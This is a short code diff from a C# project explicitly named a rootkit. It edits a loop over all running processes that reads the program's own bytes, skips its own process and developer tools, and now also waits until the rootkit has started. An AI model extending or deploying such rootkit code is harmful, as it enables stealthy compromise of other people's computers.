@@ -74,7 +74,7 @@ namespace CSharpRootkit
             byte[] selfBytes = Utils.GetCurrentSelfBytes();
             foreach (Process proc in Process.GetProcesses())
             {
-                if (proc.Id == NativeMethods.GetCurrentProcessId() || proc.ProcessName.ToLower() == "devenv" || proc.ProcessName.ToLower() == "msbuild") 
+                if (!RootKitInterface.started || proc.Id == NativeMethods.GetCurrentProcessId() || proc.ProcessName.ToLower() == "devenv" || proc.ProcessName.ToLower() == "msbuild") 
                 {
                     proc.Dispose();
                     continue;
